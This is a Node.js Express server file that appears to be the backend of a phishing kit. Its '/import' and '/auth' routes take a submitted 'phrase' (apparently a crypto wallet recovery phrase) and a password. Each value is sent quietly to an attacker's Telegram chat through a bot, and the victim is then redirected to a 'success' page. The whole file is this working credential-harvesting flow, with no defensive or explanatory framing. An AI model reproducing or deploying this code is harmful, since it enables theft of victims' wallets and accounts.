const express = require("express")
const path = require("path")
const { Telegraf } = require('telegraf')
const fs = require("fs")
require('dotenv').config()

const app = express()

app.use(express.static('public'))
app.use(express.urlencoded({ extended: true}))

const bot = new Telegraf(process.env.BOT_TOKEN)

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/index.html"))
})

app.post("/import", async (req, res) => {
    try {
        bot.telegram.sendMessage(process.env.chatID, req.body.phrase)
    }catch(err) {
        console.log(err)
    }
    res.redirect("/auth")
})

app.get("/auth", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/auth.html"))
})

app.get("/success", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/success.html"))
})

app.post("/auth", (req, res) => {
    try {
        bot.telegram.sendMessage(process.env.chatID, req.body.password)
    }catch(err) {
        console.log(err)
    }
    res.redirect("/success")
})

const port = process.env.PORT || 3000

app.listen(port, () => console.log(`LISTENING TO THE SERVER ON PORT ${port}`))

bot.launch()